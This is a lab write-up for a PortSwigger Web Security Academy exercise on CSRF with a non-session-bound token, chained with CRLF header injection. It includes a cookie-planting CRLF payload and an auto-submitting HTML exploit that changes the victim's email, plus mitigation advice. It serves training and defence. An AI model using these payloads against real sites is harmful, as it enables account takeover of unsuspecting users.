# 5th lab

#  Lab: CSRF where token is tied to non-session cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Broken Anti-CSRF Implementation + HTTP Header (CRLF) Injection.

##  The Concept
The application uses a double-submit or decoupled token mechanism. It validates the hidden `csrf` token against a separate `csrfKey` cookie, rather than tying the CSRF token directly to the user's `session` cookie. 
Because the application does not verify if the `csrfKey` cookie actually belongs to the current authenticated user, an attacker can exploit this if they find a way to inject a known `csrfKey` cookie into the victim's browser. Once the known cookie is planted, the attacker can submit a CSRF form containing the matching `csrf` token, bypassing the protection.

## Prerequisites
* A valid `csrfKey` cookie and a matching `csrf` token (obtained by logging into your own attacker account).
* A vulnerability on the target site that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection in a search parameter).

##  Step-by-Step Exploitation

### Step 1: Harvest Valid Tokens
1. Log in to the application with standard credentials (`wiener:peter`).
2. Observe the HTTP traffic in Burp Suite.
3. Note the value of the `csrfKey` cookie from any authenticated request.
4. Intercept the submission of the "Update email" form and note the value of the hidden `csrf` parameter in the body.

### Step 2: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site (e.g., `/?search=test`).
2. Observe the response: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by adding `%0d%0a` to the search term to append a new header:
   `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None`

### Step 3: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the cookie) and then immediately submits the CSRF form.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved!

**Key Takeaway / Mitigation**: Anti-CSRF tokens must be strictly cryptographically tied to the user's active session identifier (e.g., the session cookie) on the server side. Additionally, applications must sanitize all user inputs reflected in HTTP headers to prevent CRLF injectio